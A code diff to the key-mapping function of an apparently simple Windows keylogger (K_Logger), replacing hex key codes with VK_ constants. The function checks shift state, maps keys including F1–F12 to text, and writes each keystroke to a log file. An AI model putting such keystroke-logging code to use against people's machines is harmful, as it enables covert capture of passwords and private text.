@@ -317,7 +317,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 77:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "M";
 				WriteToFile("M");
@@ -331,7 +331,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 
 		case 78:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "N";
 				WriteToFile("N");
@@ -344,7 +344,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 79:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "O";
 				WriteToFile("O");
@@ -357,7 +357,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 80:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "P";
 				WriteToFile("P");
@@ -370,7 +370,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 81:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "Q";
 				WriteToFile("Q");
@@ -383,7 +383,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 82:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "R";
 				WriteToFile("R");
@@ -396,7 +396,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 83:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "S";
 				WriteToFile("S");
@@ -409,7 +409,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 84:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "T";
 				WriteToFile("T");
@@ -422,7 +422,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 85:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "U";
 				WriteToFile("U");
@@ -435,7 +435,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 86:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "V";
 				WriteToFile("V");
@@ -448,7 +448,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 87:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "W";
 				WriteToFile("W");
@@ -461,7 +461,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 88:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "X";
 				WriteToFile("X");
@@ -474,7 +474,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 89:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "Y";
 				WriteToFile("Y");
@@ -487,7 +487,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 90:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "Z";
 				WriteToFile("Z");
@@ -502,69 +502,69 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 
 
-		case 0x70:
+		case VK_F1:
 			std::cout << "  *F1*  ";
 			WriteToFile("  *F1*  ");
 			break;
 
-		case 0x71:
+		case VK_F2:
 			std::cout << "  *F2*  ";
 			WriteToFile("  *F2*  ");
 			break;
 
-		case 0x72:
+		case VK_F3:
 			std::cout << "  *F3*  ";
 			WriteToFile("  *F3*  ");
 			break;
 
-		case 0x73:
+		case VK_F4:
 			std::cout << "  *F4*  ";
 			WriteToFile("  *F4*  ");
 			break;
 
-		case 0x74:
+		case VK_F5:
 			std::cout << "  *F5*  ";
 			WriteToFile("  *F5*  ");
 			break;
 
-		case 0x75:
+		case VK_F6:
 			std::cout << "  *F6*  ";
 			WriteToFile("  *F6*  ");
 			break;
 
-		case 0x76:
+		case VK_F7:
 			std::cout << "  *F7*  ";
 			WriteToFile("  *F7*  ");
 			break;
 
-		case 0x77:
+		case VK_F8:
 			std::cout << "  *F8*  ";
 			WriteToFile("  *F8*  ");
 			break;
 
-		case 0x78:
+		case VK_F9:
 			std::cout << "  *F9*  ";
 			WriteToFile("  *F9*  ");
 			break;
 
-		case 0x79:
+		case VK_F10:
 			std::cout << "  *F10*  ";
 			WriteToFile("  *F10*  ");
 			break;
 
-		case 0x7A:
+		case VK_F11:
 			std::cout << "  *F11*  ";
 			WriteToFile("  *F11*  ");
+			break;
+
+		case VK_F12:
+			std::cout << "  *F12*  ";
+			WriteToFile("  *F12*  ");
 			break;
 
 		case 0x23:
 			std::cout << "  *END*  ";
 			WriteToFile("  *END*  ");
-			break;
-
-		case 0x7B:
-			std::cout << "  *F12*  ";
-			WriteToFile("  *F12*  ");
 			break;
 
 		case 0x24:
